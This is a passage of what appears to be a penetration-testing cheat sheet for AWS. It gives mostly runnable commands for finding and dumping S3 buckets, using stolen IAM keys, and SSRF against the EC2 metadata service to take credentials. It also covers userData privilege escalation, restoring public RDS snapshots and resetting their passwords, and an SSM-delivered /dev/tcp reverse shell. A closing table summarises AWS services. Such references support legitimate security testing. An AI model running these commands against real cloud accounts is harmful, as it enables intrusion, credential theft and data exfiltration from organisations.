aws s3 cp s3://bucket-name/&lt;file&gt; &lt;destination&gt;
aws s3 cp/mv test-file.txt s3://bucket-name
aws s3 rm s3://bucket-name/test-file.txt
aws s3api get-bucket-acl --bucket bucket-name # Check owner
aws s3api head-object --bucket bucket-name --key file.txt # Check file metadata
</code></pre>
<h3 id="find-s3-buckets"><a class="header" href="#find-s3-buckets">Find S3 buckets</a></h3>
<pre><code># Find buckets from keyword or company name
# https://github.com/nahamsec/lazys3
ruby lazys3.rb companyname

# https://github.com/initstring/cloud_enum
python3 cloud_enum.py -k companynameorkeyword

# https://github.com/gwen001/s3-buckets-finder
php s3-buckets-bruteforcer.php --bucket gwen001-test002

# Public s3 buckets
https://buckets.grayhatwarfare.com
https://github.com/eth0izzle/bucket-stream

# https://github.com/cr0hn/festin
festin mydomain.com
festin -f domains.txt 

# Google dork
site:.s3.amazonaws.com "Company"
</code></pre>
<h3 id="check-s3-buckets-perms-and-files"><a class="header" href="#check-s3-buckets-perms-and-files">Check S3 buckets perms and files</a></h3>
<pre><code># https://github.com/fellchase/flumberboozle/tree/master/flumberbuckets
alias flumberbuckets='sudo python3 PATH/flumberboozle/flumberbuckets/flumberbuckets.py -p'
echo "bucket" | flumberbuckets -si -
cat hosts.txt | flumberbuckets -si -

# https://github.com/sa7mon/S3Scanner
sudo python3 s3scanner.py sites.txt
sudo python ./s3scanner.py --include-closed --out-file found.txt --dump names.txt

# https://github.com/clario-tech/s3-inspector
python s3inspector.py

# https://github.com/jordanpotti/AWSBucketDump
source /home/cloudhacker/tools/AWSBucketDump/bin/activate
touch s.txt
sed -i "s,$,-$bapname-awscloudsec,g" /home/cloudhacker/tools/AWSBucketDump/BucketNames.txt
python AWSBucketDump.py -D -l BucketNames.txt -g s.txt

# https://github.com/Ucnt/aws-s3-data-finder/
python3 find_data.py -n bucketname -u

# https://github.com/VirtueSecurity/aws-extender-cli
python3 aws_extender_cli.py -s S3 -b flaws.cloud
</code></pre>
<h3 id="s3-examples-attacks"><a class="header" href="#s3-examples-attacks"><strong>S3 examples attacks</strong></a></h3>
<pre><code># S3 Bucket Pillaging

• GOAL: Locate Amazon S3 buckets and search them for interesting data
• In this lab you will attempt to identify a publicly accessible S3 bucket hosted by an organization. After identifying it you will list out the contents of it and download the files hosted there.

~$ sudo apt-get install python3-pip
~$ git clone https://github.com/RhinoSecurityLabs/pacu
~$ cd pacu
~$ sudo bash install.sh
~$ sudo aws configure
~$ sudo python3 pacu.py

Pacu &gt; import_keys --all
# Search by domain
Pacu &gt; run s3__bucket_finder -d glitchcloud 
# List files in bucket
Pacu &gt; aws s3 ls s3://glitchcloud
# Download files
Pacu &gt; aws s3 sync s3://glitchcloud s3-files-dir

# S3 Code Injection
• Backdoor JavaScript in S3 Buckets used by webapps 
• In March, 2018 a crypto-miner malware was found to be loading on MSN’s homepage
• This was due to AOL’s advertising platform having a writeable S3 bucket, which was being served by MSN
• If a webapp is loading content from an S3 bucket made publicly writeable attackers can upload  malicious JS to get executed by visitors 
• Can perform XSS-type attacks against webapp visitors
• Hook browser with Beef

# Domain Hijacking
• Hijack S3 domain by finding references in a webapp to S3 buckets that don’t exist anymore
• Or… subdomains that were linked to an S3 bucket with CNAME’s that still exist
• When assessing webapps look for 404’s to *.s3.amazonaws.com
• When brute forcing subdomains for an org look for 404’s with ‘NoSuchBucket’ error 
• Go create the S3 bucket with the same name and region 
• Load malicious content to the new S3 bucket that will be executed when visitors hit the site
</code></pre>
<h3 id="enumerate-read-access-buckets-script"><a class="header" href="#enumerate-read-access-buckets-script">Enumerate read access buckets script</a></h3>
<pre><code class="language-bash">#!/bin/bash
for i in "$@" ; do
 if [[ $i == "--profile" ]] ; then
            profile=$(echo "$@" | awk '{for(i=1;i&lt;=NF;i++) if ($i=="--profile") print $(i+1)}')
            AWS_ACCESS_KEY_ID=$(cat /root/.aws/credentials | grep -i "$profile" -A 2 | grep -i = | cut -d " " -f 3 | head -n 1)
            AWS_SECRET_ACCESS_KEY=$(cat /root/.aws/credentials | grep -i "$profile" -A 2 | grep -i = | cut -d " " -f 3 | tail -n 1)
            break
        fi
done
echo "Enumerating the buckets..."
    aws --profile "$profile" s3 ls | cut -d ' ' -f 3 &gt; /tmp/buckets
echo "You can read the following buckets:"
    &gt;/tmp/readBuckets
for i in $(cat /tmp/buckets); do
    result=$(aws --profile "$profile" s3 ls s3://"$i" 2&gt;/dev/null | head -n 1)
    if [ ! -z "$result" ]; then
            echo "$i" | tee /tmp/readBuckets
                    unset result
    fi
done
</code></pre>
<h2 id="iam"><a class="header" href="#iam">IAM</a></h2>
<h3 id="basic-commands-1"><a class="header" href="#basic-commands-1">Basic commands</a></h3>
<pre><code># ~/.aws/credentials
[default]
aws_access_key_id = XXX
aws_secret_access_key = XXXX

export AWS_ACCESS_KEY_ID=
export AWS_SECRET_ACCESS_KEY=
export AWS_DEFAULT_REGION=

# Check valid
aws sts get-caller-identity
aws sdb list-domains --region us-east-1

# If we can steal AWS credentials, add to your configuration
aws configure --profile stolen
# Open ~/.aws/credentials
# Under the [stolen] section add aws_session_token and add the discovered token value here
aws sts get-caller-identity --profile stolen

# Get account id
aws sts get-access-key-info --access-key-id=ASIA1234567890123456

aws iam get-account-password-policy
aws sts get-session-token
aws iam list-users
aws iam list-roles
aws iam list-access-keys --user-name &lt;username&gt;
aws iam create-access-key --user-name &lt;username&gt;
aws iam list-attached-user-policies --user-name XXXX
aws iam get-policy
aws iam get-policy-version

aws deploy list-applications

aws directconnect describe-connections

aws secretsmanager get-secret-value --secret-id &lt;value&gt; --profile &lt;container tokens&gt;

aws sns publish --topic-arn arn:aws:sns:us-east-1:*account id*:aaa --message aaa

# IAM Prefix meaning
ABIA - AWS STS service bearer token
ACCA - Context-specific credential
AGPA - Group
AIDA - IAM user
AIPA - Amazon EC2 instance profile
AKIA - Access key
ANPA - Managed policy
ANVA - Version in a managed policy
APKA - Public key
AROA - Role
ASCA - Certificate
ASIA - Temporary (AWS STS) access key IDs use this prefix, but are unique only in combination with the secret access key and the session token.
</code></pre>
<h3 id="tools-27"><a class="header" href="#tools-27">Tools</a></h3>
<pre><code># https://github.com/andresriancho/enumerate-iam
python enumerate-iam.py --access-key XXXXXXXXXXXXX --secret-key XXXXXXXXXXX
python enumerate-iam.py --access-key "ACCESSKEY" --secret-key "SECRETKEY" (--session-token "$AWS_SESSION_TOKEN")

# https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws_escalate.py
python aws_escalate.py

# https://github.com/andresriancho/nimbostratus
python2 nimbostratus dump-permissions

# https://github.com/nccgroup/ScoutSuite
python3 scout.py aws

# https://github.com/salesforce/cloudsplaining
cloudsplaining download
cloudsplaining scan

# Enumerate IAM permissions without logging (stealth mode)
# https://github.com/Frichetten/aws_stealth_perm_enum

# Unauthenticated (only account id) Enumeration of IAM Users and Roles 
# https://github.com/Frichetten/enumate_iam_using_bucket_policy

# AWS Consoler
# https://github.com/NetSPI/aws_consoler
# Generate link to console from valid credentials
aws_consoler -a ASIAXXXX -s SECRETXXXX -t TOKENXXXX

# AWSRoleJuggler
# https://github.com/hotnops/AWSRoleJuggler/
# You can use one assumed role to assume another one
./find_circular_trust.py 
python aws_role_juggler.py -r arn:aws:iam::123456789:role/BuildRole arn:aws:iam::123456789:role/GitRole arn:aws:iam::123456789:role/ArtiRole

# https://github.com/prisma-cloud/IAMFinder
python3 iamfinder.py init
python3 iamfinder.py enum_user --aws_id 123456789012

# https://github.com/nccgroup/PMapper
# Check IAM permissions

# https://github.com/prowler-cloud/prowler
# almost 300 checks for AWS but for pentesting and enumeraiton run:
prowler aws --categories internet-exposed
prowler aws --categories secrets
# see if there is something exposed in shodan from that account
prowler -c ec2_elastic_ip_shodan --shodan $SHODAN_API_KEY --verbose
# check for the most important checks in terms of severity
prowler aws --severity critical high
</code></pre>
<h3 id="aws-iam-cli-enumeration"><a class="header" href="#aws-iam-cli-enumeration">AWS IAM Cli Enumeration</a></h3>
<pre><code class="language-bash"># First of all, set your profile
aws configure --profile test 
set profile=test # Just for convenience

# Get policies available
aws --profile "$profile" iam list-policies | jq -r ".Policies[].Arn"
# Get specific policy version
aws --profile "$profile" iam get-policy --policy-arn "$i" --query "Policy.DefaultVersionId" --output text
# Get all juicy info oneliner (search for Action/Resource */*)
profile="test"; for i in $(aws --profile "$profile" iam list-policies | jq -r '.Policies[].Arn'); do echo "Describing policy $i" &amp;&amp; aws --profile "$profile" iam get-policy-version --policy-arn "$i" --version-id $(aws --profile "$profile" iam get-policy --policy-arn "$i" --query 'Policy.DefaultVersionId' --output text); done | tee /tmp/policies.log 

#List Managed User policies
aws --profile "test" iam list-attached-user-policies --user-name "test-user"
#List Managed Group policies
aws --profile "test" iam list-attached-group-policies --group-name "test-group"
#List Managed Role policies
aws --profile "test" iam list-attached-role-policies --role-name "test-role"

#List Inline User policies
aws --profile "test" iam list-user-policies --user-name "test-user"
#List Inline Group policies
aws --profile "test" iam list-group-policies --group-name "test-group"
#List Inline Role policies
aws --profile "test" iam list-role-policies --role-name "test-role"

#Describe Inline User policies 
aws --profile "test" iam get-user-policy --user-name "test-user" --policy-name "test-policy"
#Describe Inline Group policies
aws --profile "test" iam get-group-policy --group-name "test-group" --policy-name "test-policy"
#Describe Inline Role policies
aws --profile "test" iam get-role-policy --role-name "test-role" --policy-name "test-policy"

# List roles policies
aws --profile "test" iam get-role --role-name "test-role" 

# Assume role from any ec2 instance (get Admin)
# Create instance profile
aws iam create-instance-profile --instance-profile-name YourNewRole-Instance-Profile
# Associate role to Instance Profile
aws iam add-role-to-instance-profile --role-name YourNewRole --instance-profile-name YourNewRole-Instance-Profile
# Associate Instance Profile with instance you want to use
aws ec2 associate-iam-instance-profile --instance-id YourInstanceId --iam-instance-profile Name=YourNewRole-Instance-Profile

# Get assumed roles in instance
aws --profile test sts get-caller-identity

# Shadow admin
aws iam list-attached-user-policies --user-name {}
aws iam get-policy-version --policy-arn provide_policy_arn --version-id $(aws iam get-policy --policy-arn provide_policy_arn --query 'Policy.DefaultVersionId' --output text)
aws iam list-user-policies --user-name {}
aws iam get-user-policy --policy-name policy_name_from_above_command --user-name {} | python -m json.tool
# Vulnerables policies:
iam:CreatUser
iam:CreateLoginProfile
iam:UpdateProfile
iam:AddUserToGroup
</code></pre>
<h2 id="ebs"><a class="header" href="#ebs">EBS</a></h2>
<h3 id="find-secrets-in-public-ebs"><a class="header" href="#find-secrets-in-public-ebs">Find secrets in public EBS</a></h3>
<pre><code># Dufflebag https://github.com/bishopfox/dufflebag
</code></pre>
<h3 id="ebs-attack-example"><a class="header" href="#ebs-attack-example"><strong>EBS attack example</strong></a></h3>
<pre><code># Discover EBS Snapshot and mount it to navigate
- Obtaning public snapshot name
aws ec2 describe-snapshots --region us-east-1 --restorable-by-user-ids all | grep -C 10 "company secrets"
- Obtaining zone and instance
aws ec2 describe-instances --filters Name=tag:Name,Values=attacker-machine
- Create a new volume of it
aws ec2 create-volume --snapshot-id snap-03616657ede4b9862 --availability-zone &lt;ZONE-HERE&gt;
- Attach to an EC2 instance
aws ec2 attach-volume --device /dev/sdh --instance-id &lt;INSTANCE-ID&gt; --volume-id &lt;VOLUME-ID&gt;
    - It takes some time, to see the status:
    aws ec2 describe-volumes --filters Name=volume-id,Values=&lt;VOLUME-ID&gt;
- Once is mounted in EC2 instance, check it, mount it and access it:
sudo lsblk
sudo mount /dev/xvdh1 /mnt
cd /mnt/home/user/companydata
</code></pre>
<pre><code># WeirdAAL https://github.com/carnal0wnage/weirdAAL
</code></pre>
<h2 id="ec2"><a class="header" href="#ec2"><strong>EC2</strong></a></h2>
<h3 id="ec2-basic-commands"><a class="header" href="#ec2-basic-commands"><strong>EC2 basic commands</strong></a></h3>
<pre><code># Like traditional host
- Port enumeration
- Attack interesting services like ssh or rdp

aws ec2 describe-instances
aws ssm describe-instance-information
aws ec2 describe-snapshots
aws ec2 describe-security-groups --group-ids &lt;VPC Security Group ID&gt; --region &lt;region&gt;
aws ec2 create-volume --snapshot-id snap-123123123
aws ec2 describe-snapshots --owner-ids {user-id}

# SSH into created instance:
ssh -i ".ssh/key.pem" &lt;user&gt;@&lt;instance-ip&gt;
sudo mount /dev/xvdb1 /mnt
cat /mnt/home/ubuntu/setupNginx.sh

# EC2 security group
aws ec2 describe-security-groups
aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values='0.0.0.0/0' --query "SecurityGroups[*].[GroupName]" --output text
</code></pre>
<h3 id="ec2-example-attacks"><a class="header" href="#ec2-example-attacks"><strong>EC2 example attacks</strong></a></h3>
<pre><code># SSRF to http://169.254.169.254 (Metadata server)
curl http://&lt;ec2-ip-address&gt;/\?url\=http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/public-hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/network/interfaces/
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key/
http://169.254.169.254/latest/user-data

# Find IAM Security Credentials
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Using EC2 instance metadata tool
ec2-metadata -h
# With EC2 Instance Meta Data Service version 2 (IMDSv2):
Append X-aws-ec2-metadata-token Header generated with a PUT request to http://169.254.169.254/latest/api/token

# Check directly for metadata instance
curl -s http://&lt;ec2-ip-address&gt;/latest/meta-data/ -H 'Host:169.254.169.254'

# EC2 instance connect
aws ec2 describe-instances | jq ".[][].Instances | .[] | {InstanceId, KeyName, State}"
aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE_WE_GOT_PREVIOUSLY --availability-zone zone --instance-os-user ubuntu --ssh-public-key file://shortkey.pub

# EC2 AMI - Read instance, create AMI for instance and run
aws ec2 describe-images --region specific-region
aws ec2 create-image --instance-id ID --name "EXPLOIT" --description "Export AMI" --region specific-region
aws ec2 import-key-pair --key-name "EXPLOIT" --public-key-material fileb:///publickeyfile
aws ec2 describe-images --filters "Name=name,Values=EXPLOIT"
aws ec2 run-instances --image-id {} --security-group-ids "" --subnet-id {} --count 1 --instance-type t2.micro --key-name EXPLOIT

# Create volume from snapshot &amp; attach to instance id &amp;&amp; mount in local
aws ec2 create-volume –snapshot-id snapshot_id --availability-zone zone
aws ec2 attach-volume --volume-id above-volume-id --instance-id instance-id --device /dev/sdf

# Privesc with modify-instance-attribute
aws ec2 modify-instance-attribute --instance-id=xxx --attribute userData --value file://file.b64.txt
file.b64.txt contains (and after base64 file.txt &gt; file.b64.txt):
```
Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
**commands here** (reverse shell, set ssh keys...)
--//
```

# Privesc 2 with user data
# On first launch, the EC2 instance will pull the start_script from S3 and will run it. If an adversary can write to that location, they can escalate privileges or gain control of the EC2 instance.
#!/bin/bash
aws s3 cp s3://example-boot-bucket/start_script.sh /root/start_script.sh
chmod +x /root/start_script.sh
/root/start_script.sh
</code></pre>
<h3 id="tools-28"><a class="header" href="#tools-28">Tools</a></h3>
<pre><code># EC2 Shadow Copy attack
# https://github.com/Static-Flow/CloudCopy

# EC2 secrets recovery
# https://github.com/akhil-reni/ud-peep
</code></pre>
<h2 id="cloudfront"><a class="header" href="#cloudfront">Cloudfront</a></h2>
<h3 id="info"><a class="header" href="#info">Info</a></h3>
<pre><code>Cloudfront is a CDN and it checks the HOST header in CNAMES, so:
- The domain "test.disloops.com" is a CNAME record that points to "disloops.com".
- The "disloops.com" domain is set up to use a CloudFront distribution.
- Because "test.disloops.com" was not added to the "Alternate Domain Names (CNAMEs)" field for the distribution, requests to "test.disloops.com" will fail.
- Another user can create a CloudFront distribution and add "test.disloops.com" to the "Alternate Domain Names (CNAMEs)" field to hijack the domain.
</code></pre>
<h3 id="tools-29"><a class="header" href="#tools-29">Tools</a></h3>
<pre><code># https://github.com/MindPointGroup/cloudfrunt
git clone --recursive https://github.com/MindPointGroup/cloudfrunt
pip install -r requirements.txt
python cloudfrunt.py -o cloudfrunt.com.s3-website-us-east-1.amazonaws.com -i S3-cloudfrunt -l list.txt
</code></pre>
<h2 id="aws-lambda"><a class="header" href="#aws-lambda"><strong>AWS Lambda</strong></a></h2>
<h3 id="info-1"><a class="header" href="#info-1"><strong>Info</strong></a></h3>
<pre><code># Welcome to serverless!!!!
# AWS Lambda, essentially are short lived servers that run your function and provide you with output that can be then used in other applications or consumed by other endpoints.

# OS command Injection in Lambda
curl "https://API-endpoint/api/stringhere"

# For a md5 converter endpoint "https://API-endpoint/api/hello;id;w;cat%20%2fetc%2fpasswd"
aws lambda list-functions
aws lambda get-function --function-name &lt;FUNCTION-NAME&gt;
aws lambda get-policy
aws apigateway get-stages

# Download function code
aws lambda list-functions
aws lambda get-function --function-name name_we_retrieved_from_above --query 'Code.Location'
wget -O myfunction.zip URL_from_above_step

# Steal creds via XXE or SSRF reading:
/proc/self/environ
# If blocked try to read other vars:
/proc/[1..20]/environ
</code></pre>
<h3 id="tools-30"><a class="header" href="#tools-30">Tools</a></h3>
<pre><code># https://github.com/puresec/lambda-proxy
# SQLMap to Lambda!!!
python3 main.py
sqlmap -r request.txt

# https://github.com/twistlock/splash
# Pseudo Lambda Shell

</code></pre>
<h2 id="aws-inspector"><a class="header" href="#aws-inspector"><strong>AWS Inspector</strong></a></h2>
<pre><code># Amazon Inspector is an automated security assessment service that helps improve the security and compliance of applications deployed on AWS.
</code></pre>
<h2 id="aws-rds"><a class="header" href="#aws-rds"><strong>AWS RDS</strong></a></h2>
<h3 id="basic-3"><a class="header" href="#basic-3"><strong>Basic</strong></a></h3>
<pre><code>aws rds describe-db-instances
</code></pre>
<h3 id="attacks-2"><a class="header" href="#attacks-2"><strong>Attacks</strong></a></h3>
<pre><code># Just like a MySQL, try for sqli!
# Check if 3306 is exposed
# Sqlmap is your friend ;)

# Stealing RDS Snapshots
- Searching partial snapshots
aws rds describe-db-snapshots --include-public --snapshot-type public --db-snapshot-identifier arn:aws:rds:us-east-1:159236164734:snapshot:globalbutterdbbackup
- Restore in instance
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier recoverdb --publicly-accessible --db-snapshot-identifier arn:aws:rds:us-east-1:159236164734:snapshot:globalbutterdbbackup --availability-zone us-east-1b
- Once restored, try to access
aws rds describe-db-instances --db-instance-identifier recoverdb
- Reset the master credentials
aws rds modify-db-instance --db-instance-identifier recoverdb --master-user-password NewPassword1 --apply-immediately
    - Takes some time, you can check the status:
    aws rds describe-db-instances
- Try to access it from EC2 instance which was restored
nc rds-endpoint 3306 -zvv    
- If you can't see, you may open 3306:
    - In RDS console, click on the recoverdb instance
    - Click on the Security Group
    - Add an Inbound rule for port 3306 TCP for Cloudhacker IP
 - Then connect it
 mysql -u &lt;username&gt; -p -h &lt;rds-instance-endpoint&gt;

</code></pre>
<h2 id="ecr"><a class="header" href="#ecr">ECR</a></h2>
<h3 id="info-2"><a class="header" href="#info-2">Info</a></h3>
<pre><code>Amazon Elastic Container Registry - Docker container registry
aws ecr get-login
aws ecr get-login-password | docker login --username AWS --password-stdin XXXXXXXXX.dkr.ecr.eu-west-1.amazonaws.com/some-registry &amp;&amp; docker pull XXXXXXXX.dkr.ecr.eu-west-1.amazonaws.com/docker-test:latest &amp;&amp; docker inspect docker-test
aws ecr list-images --repository-name REPO_NAME --registry-id ACCOUNT_ID
aws ecr batch-get-image --repository-name XXXX --registry-id XXXX --image-ids imageTag=latest
aws ecr get-download-url-for-layer --repository-name XXXX --registry-id XXXX --layer-digest "sha256:XXXXX"

</code></pre>
<h3 id="tools-31"><a class="header" href="#tools-31">Tools</a></h3>
<pre><code># After AWS credentials compromised

# https://github.com/RhinoSecurityLabs/ccat
docker run -it -v ~/.aws:/root/.aws/ -v /var/run/docker.sock:/var/run/docker.sock -v ${PWD}:/app/ rhinosecuritylabs/ccat:latest
</code></pre>
<h2 id="ecs"><a class="header" href="#ecs">ECS</a></h2>
<h3 id="info-3"><a class="header" href="#info-3">Info</a></h3>
<pre><code>ECS - Elastic Container Service (is a container orchestration service)
</code></pre>
<h2 id="aws-cognito-api"><a class="header" href="#aws-cognito-api"><strong>AWS Cognito API</strong></a></h2>
<p>Amazon Cognito is a user identity and data synchronization service. If the website uses other AWS services (like Amazon S3, Amazon Dynamo DB, etc.) Amazon Cognito provides you with delivering temporary credentials with limited privileges that users can use to access database resources.</p>
<pre><code># Check for cognito-identity requests with GetCredentialsForIdentity 
</code></pre>
<p><img src="enumeration/cloud/../../.gitbook/assets/image%20(35).png" alt="" /></p>
<p><img src="enumeration/cloud/../../.gitbook/assets/image%20(42).png" alt="" /></p>
<h2 id="aws-systems-manager"><a class="header" href="#aws-systems-manager"><strong>AWS Systems Manager</strong></a></h2>
<p><img src="enumeration/cloud/../../.gitbook/assets/imagen%20(21).png" alt="" /></p>
<pre><code># AWS SSM
- The agent must be installed in the machines
- It's used to create roles and policies

# Executing commands
aws ssm describe-instance-information #Get instance
aws ssm describe-instance-information --output text --query "InstanceInformationList[*]"
- Get "ifconfig" commandId
aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP config" --parameters commands=ifconfig --output text --query "Command.CommandId"
- Execute CommandID generated for ifconfig
aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}"

# RCE
aws ssm send-command --document-name "AWS-RunShellScript" --comment "RCE test: whoami" --targets "Key=instanceids,Values=[instanceid]" --parameters 'commands=whoami'
aws ssm list-command-invocations --command-id "[CommandId]" --details

# Getting shell
- You already need to have reverse.sh uploaded to s3
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/REVERSE-SHELL-CATCHER/9999 0&gt;&amp;1
- Start your listener
aws ssm send-command --document-name "AWS-RunRemoteScript" --instance-ids "INSTANCE-ID-HERE" --parameters '{"sourceType":["S3"],"sourceInfo":["{\"path\":\"PATH-TO-S3-SHELL-SCRIPT\"}"],"commandLine":["/bin/bash NAME-OF-SHELL-SCRIPT"]}' --query "Command.CommandId"

# Read info from SSM
aws ssm describe-parameters
aws ssm get-parameters --name &lt;NameYouFindAbove&gt;

# EC2 with SSM enabled leads to RCE
aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile stolencreds
aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}" --profile stolencreds
</code></pre>
<h2 id="aws-services-summary"><a class="header" href="#aws-services-summary">Aws Services Summary</a></h2>
<div class="table-wrapper"><table><thead><tr><th>AWS Service</th><th>Should have been called</th><th>Use this to</th><th>It's like</th></tr></thead><tbody>
<tr><td>EC2</td><td>Amazon Virtual Servers</td><td>Host the bits of things you think of as a computer.</td><td>It's handwavy, but EC2 instances are similar to the virtual private servers you'd get at Linode, DigitalOcean or Rackspace.</td></tr>
<tr><td>IAM</td><td>Users, Keys and Certs</td><td>Set up additional users, set up new AWS Keys and policies.</td><td></td></tr>
<tr><td>S3</td><td>Amazon Unlimited FTP Server</td><td>Store images and other assets for websites. Keep backups and share files between services. Host static websites. Also, many of the other AWS services write and read from S3.</td><td></td></tr>
<tr><td>VPC</td><td>Amazon Virtual Colocated Rack</td><td>Overcome objections that "all our stuff is on the internet!" by adding an additional layer of security. Makes it appear as if all of your AWS services are on the same little network instead of being small pieces in a much bigger network.</td><td>If you're familar with networking: VLANs</td></tr>
<tr><td>Lambda</td><td>AWS App Scripts</td><td>Run little self contained snippets of JS, Java or Python to do discrete tasks. Sort of a combination of a queue and execution in one. Used for storing and then executing changes to your AWS setup or responding to events in S3 or DynamoDB.</td><td></td></tr>
<tr><td>API Gateway</td><td>API Proxy</td><td>Proxy your apps API through this so you can throttle bad client traffic, test new versions, and present methods more cleanly.</td><td>3Scale</td></tr>
<tr><td>RDS</td><td>Amazon SQL</td><td>Be your app's Mysql, Postgres, and Oracle database.</td><td>Heroku Postgres</td></tr>
<tr><td>Route53</td><td>Amazon DNS + Domains</td><td>Buy a new domain and set up the DNS records for that domain.</td><td>DNSimple, GoDaddy, Gandi</td></tr>
<tr><td>SES</td><td>Amazon Transactional Email</td><td>Send one-off emails like password resets, notifications, etc. You could use it to send a newsletter if you wrote all the code, but that's not a great idea.</td><td>SendGrid, Mandrill, Postmark</td></tr>
<tr><td>Cloudfront</td><td>Amazon CDN</td><td>Make your websites load faster by spreading out static file delivery to be closer to where your users are.</td><td>MaxCDN, Akamai</td></tr>
<tr><td>CloudSearch</td><td>Amazon Fulltext Search</td><td>Pull in data on S3 or in RDS and then search it for every instance of 'Jimmy.'</td><td>Sphinx, Solr, ElasticSearch</td></tr>
<tr><td>DynamoDB</td><td>Amazon NoSQL</td><td>Be your app's massively scalable key valueish store.</td><td>MongoLab</td></tr>
<tr><td>Elasticache</td><td>Amazon Memcached</td><td>Be your app's Memcached or Redis.</td><td>Redis to Go, Memcachier</td></tr>
<tr><td>Elastic Transcoder</td><td>Amazon Beginning Cut Pro</td><td>Deal with video weirdness (change formats, compress, etc.).</td><td></td></tr>
<tr><td>SQS</td><td>Amazon Queue</td><td>Store data for future processing in a queue. The lingo for this is storing "messages" but it doesn't have anything to do with email or SMS. SQS doesn't have any logic, it's just a place to put things and take things out.</td><td>RabbitMQ, Sidekiq</td></tr>
<tr><td>WAF</td><td>AWS Firewall</td><td>Block bad requests to Cloudfront protected sites (aka stop people trying 10,000 passwords against /wp-admin)</td><td>Sophos, Kapersky</td></tr>
<tr><td>Cognito</td><td>Amazon OAuth as a Service</td><td>Give end users - (non AWS) - the ability to log in with Google, Facebook, etc.</td><td>OAuth.io</td></tr>
<tr><td>Device Farm</td><td>Amazon Drawer of Old Android Devices</td><td>Test your app on a bunch of different IOS and Android devices simultaneously.</td><td>MobileTest, iOS emulator</td></tr>
<tr><td>Mobile Analytics</td><td>Spot on Name, Amazon Product Managers take note</td><td>Track what people are doing inside of your app.</td><td>Flurry</td></tr>
<tr><td>SNS</td><td>Amazon Messenger</td><td>Send mobile notifications, emails and/or SMS messages</td><td>UrbanAirship, Twilio</td></tr>
<tr><td>CodeCommit</td><td>Amazon GitHub</td><td>Version control your code - hosted Git.</td><td>Github, BitBucket</td></tr>
<tr><td>Code Deploy</td><td>Not bad</td><td>Get your code from your CodeCommit repo (or Github) onto a bunch of EC2 instances in a sane way.</td><td>Heroku, Capistrano</td></tr>
<tr><td>CodePipeline</td><td>Amazon Continuous Integration</td><td>Run automated tests on your code and then do stuff with it depending on if it passes those tests.</td><td>CircleCI, Travis</td></tr>
<tr><td>EC2 Container Service</td><td>Amazon Docker as a Service</td><td>Put a Dockerfile into an EC2 instance so you can run a website.</td><td></td></tr>
<tr><td>Elastic Beanstalk</td><td>Amazon Platform as a Service</td><td>Move your app hosted on Heroku to AWS when it gets too expensive.</td><td>Heroku, BlueMix, Modulus</td></tr>
<tr><td>AppStream</td><td>Amazon Citrix</td><td>Put a copy of a Windows application on a Windows machine that people get remote access to.</td><td>Citrix, RDP</td></tr>
<tr><td>Direct Connect</td><td>Pretty spot on actually</td><td>Pay your Telco + AWS to get a dedicated leased line from your data center or network to AWS. Cheaper than Internet out for Data.</td><td>A toll road turnpike bypassing the crowded side streets.</td></tr>
<tr><td>Directory Service</td><td>Pretty spot on actually</td><td>Tie together other apps that need a Microsoft Active Directory to control them.</td><td></td></tr>
<tr><td>WorkDocs</td><td>Amazon Unstructured Files</td><td>Share Word Docs with your colleagues.</td><td>Dropbox, DataAnywhere</td></tr>
<tr><td>WorkMail</td><td>Amazon Company Email</td><td>Give everyone in your company the same email system and calendar.</td><td>Google Apps for Domains</td></tr>
<tr><td>Workspaces</td><td>Amazon Remote Computer</td><td>Gives you a standard windows desktop that you're remotely controlling.</td><td></td></tr>
<tr><td>Service Catalog</td><td>Amazon Setup Already</td><td>Give other AWS users in your group access to preset apps you've built so they don't have to read guides like this.</td><td></td></tr>
<tr><td>Storage Gateway</td><td>S3 pretending it's part of your corporate network</td><td>Stop buying more storage to keep Word Docs on. Make automating getting files into S3 from your corporate network easier.</td><td></td></tr>
<tr><td>Data Pipeline</td><td>Amazon ETL</td><td>Extract, Transform and Load data from elsewhere in AWS. Schedule when it happens and get alerts when they fail.</td><td></td></tr>
<tr><td>Elastic Map Reduce</td><td>Amazon Hadooper</td><td>Iterate over massive text files of raw data that you're keeping in S3.</td><td>Treasure Data</td></tr>
<tr><td>Glacier</td><td>Really slow Amazon S3</td><td>Make backups of your backups that you keep on S3. Also, beware the cost of getting data back out in a hurry. For long term archiving.</td><td></td></tr>
<tr><td>Kinesis</td><td>Amazon High Throughput</td><td>Ingest lots of data very quickly (for things like analytics or people retweeting Kanye) that you then later use other AWS services to analyze.</td><td>Kafka</td></tr>
<tr><td>RedShift</td><td>Amazon Data Warehouse</td><td>Store a whole bunch of analytics data, do some processing, and dump it out.</td><td></td></tr>
<tr><td>Machine Learning</td><td>Skynet</td><td>Predict future behavior from existing data for problems like fraud detection or "people that bought x also bought y."</td><td></td></tr>
